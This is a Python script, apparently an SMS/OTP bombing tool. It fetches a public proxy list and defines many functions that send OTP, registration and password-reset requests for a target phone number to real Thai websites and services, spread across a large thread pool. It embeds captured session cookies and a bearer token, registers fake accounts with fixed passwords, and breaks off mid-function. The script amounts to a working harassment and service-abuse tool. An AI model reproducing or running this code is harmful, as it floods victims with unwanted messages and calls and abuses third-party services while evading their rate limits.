import os
import json
from requests import post, Session, get
from re import search
from random import choice
from string import ascii_uppercase, digits
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
import requests as ru
import discord
from googletrans import Translator
import requests
from geolite2 import geolite2

proxy = get(
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
).text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()




def randomString(N):
  return ''.join(choice(ascii_uppercase + digits) for _ in range(N))


threading = ThreadPoolExecutor(max_workers=int(100000000))
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40}"
header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38}"


def apis(phone):
  head = {
    "content-type":
    "application/json;charset=UTF-8",
    "user-agent":
    "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "accept":
    "application/json, text/plain, */*",
    "referer":
    "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
    "cookie":
    "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
  }
  post("https://www.carsome.co.th/website/login/sendSMS",
       proxies={
         "http": "http://" + random.choice(proxy)
       },
       header=head,
       json={
         "username": phone,
         "optType": 0
       }).json()


def api1(phone):
  post(
    'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With":
      "XMLHttpRequest",
      "Cookie":
      "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
    },
    data=
    f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
  )


def apidis(phone):
  post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
       header={"User-Agent": useragent},
       data={"phone": phone})


def apitrue(phone):
  post("https://www.theconcert.com/rest/request-otp",
       proxies={"http": "http://" + random.choice(proxy)},
       header={"User-Agent": useragent},
       data={
         'mobile': f"{phone}",
         'country_code': "TH",
         'lang': "th",
         'channel': "call",
         'digit': '4'
       })


def api2(phone):
  post(
    "https://shopgenix.com/api/sms/otp/",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "shopgenix.com",
      "content-length": "37",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "sec-ch-ua-platform": "Android",
      "accept": "application/json, text/javascript, /; q=0.01",
      "origin": "https://shopgenix.com",
      "referer": "https://shopgenix.com/app/5364874/",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty"
    },
    data=f"mobile_country_id=1&mobile={phone}")





def api4(phone):
  post(
    "https://www.nowbet.com/th/api/sendotpth",
    proxies={"http": "http://" + random.choice(proxy)},
    data=f"countryCode=TH&mobileId={phone}&lang=th",
    headers={
      "content-type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
      "cookie":
      "SESS83a7d6b33c387766ae5a70114b602df1=6qfWqbFmub7pFfl%2CIupZdbbW-tlmJiOkDaVeElRTFc7fo3QN;lang=th;_fbp=fb.1.1651112908737.938380324"
    })


def api5(phone):
  post(
    "https://api.ulive.youpik.com/api-base/sms/sendCode",
    proxies={"http": "http://" + random.choice(proxy)},
    data=f"phone={phone}&type=1",
    headers={
      "content-type":
      "application/x-www-form-urlencoded;charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"
    })


def api6(phone):
  post("https://play.gkingbet.com/api/register/sms",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "phone": phone,
         "agent_id": 5,
         "country_code": "TH"
       })


def api7(phone):
  ru.post(
    "https://www.tgfone.com/signin/otp_chk_fast",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "text/html, */*; q=0.01",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "origin": "https://www.tgfone.com",
      "referer": "https://www.tgfone.com/login"
    },
    data=f"mobile={phone}&type_otp=7")


def api8(phone):
  post(
    "https://www.beauticool.com/?m=request_otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.beauticool.com",
      "referer": "https://www.beauticool.com/m/signup_tel.php",
      "cookie": "PHPSESSID=udogc4sigrtvi4lvkll4g62gp3",
      "cookie": "_ga=GA1.1.1703943258.1663615884",
      "cookie": "trustedsite_visit=1",
      "cookie": "_ga_PZZ327LRJ2=GS1.1.1663615884.1.1.1663615918.0.0.0"
    },
    data=f"tel={phone}")


def api9(phone):
  post(
    "https://api.sa.game/api/Account/SendRegisterVerificationSms",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Accept": "application/json; charset=UTF-8",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "lobbyId": "23",
      "userDeviceTypeId": "6",
      "sec-ch-ua-platform": "Android",
      "Origin": "https://sa.game",
      "Sec-Fetch-Site": "same-site",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://sa.game/"
    },
    data={
      "countryId": 7,
      "phoneNumber": f"{phone}"
    })


def api10(phone):
  post(
    "https://ufaclub99.com/member/Register/Request_OTP",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "origin": "https://ufaclub99.com",
      "referer": "https://ufaclub99.com/member/register",
      "cookie": "ci_session=re834geqv85ugp62u6v88i9n15ub5qin"
    },
    data=f"phonetxt={phone}")


def api11(phone):
  post(
    "https://aff.ufaclub24.org/pin.php",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "origin":
      "https://aff.ufaclub24.org",
      "content-type":
      "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "referer":
      "https://aff.ufaclub24.org/phoneregis.php?invitekey=41bfd20a38bb1b0bec75acf0845530a7",
      "cookie":
      "PHPSESSID=n6da80gl0j6u7ob1ltlseb5m6p;_ga=GA1.2.18658305.1649308092;_gid=GA1.2.1210153607.1649308092;_gat_gtag_UA_155192447_2=1"
    },
    data=f"invitekey=41bfd20a38bb1b0bec75acf0845530a7&txtTel={phone}")


def api12(phone):
  post(
    "https://ufa8.co/register",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "origin": "https://ufa8.co",
      "content-type": "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "referer": "https://ufa8.co/register"
    },
    data=
    f"register=1&phone={phone}&password=Kan064402&password2=Kan064402&line=Garenarov"
  )


def api13(phone):
  post(
    "https://topping.truemoveh.com/api/get_request_otp",
    proxies={"http": "http://" + random.choice(proxy)},
    data=f"mobile_number={phone}",
    headers={
      "Accept":
      "application/json, text/plain, /",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded",
      "Referer":
      "https://topping.truemoveh.com/otp?callback=/campaign/104",
      "Cookie":
      "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"
    })


def api14(phone):
  post(
    f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",
    proxies={"http": "http://" + random.choice(proxy)})


def api100(phone):
  post(
    "https://cognito-idp.ap-southeast-1.amazonaws.com/",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "cache-control": "max-age=0",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
      "content-type": "application/x-amz-json-1.1",
      "x-amz-target":
      "AWSCognitoIdentityProviderService.ResendConfirmationCode",
      "x-amz-user-agent": "aws-amplify/0.1.x js",
      "referer": "https://www.bugaboo.tv/members/resetpass/phone"
    },
    json={
      "ClientId": "6g47av6ddfcvi06v4l186c16d6",
      "Username": f"+66{phone[1:]}"
    })


def api15(phone):
  post(
    "https://www.bigthailand.com/authentication-service/user/OTP",
    proxies={"http": "http://" + random.choice(proxy)},
    json={
      "locale": "th",
      "phone": f"+66{phone[1:]}",
      "email": "dkdk@gmail.com",# ------------------------------------------ ห้ามก๊อป
      "userParams": {
        "buyerName": "ekek ks",
        "activateLink": "www.google.com"
      }
    },
    headers={
      "content-type":
      "application/json",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "authorization":
      "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg",
      "cookie":
      "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"
    })


def api16(phone):
  get(
    f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
    proxies={"http": "http://" + random.choice(proxy)})


def api17(phone):
  post(
    "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
    proxies={"http": "http://" + random.choice(proxy)},
    json={
      "username": phone,
      "password": "1111a1111A",
      "name": phone,
      "provinceCode": "74",
      "districtCode": "970",
      "subdistrictCode": "8654",
      "zipcode": "94140",
      "siebelCustomerTypeId": "710",
      "locale": "th_TH"
    },
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 11; V2043) 
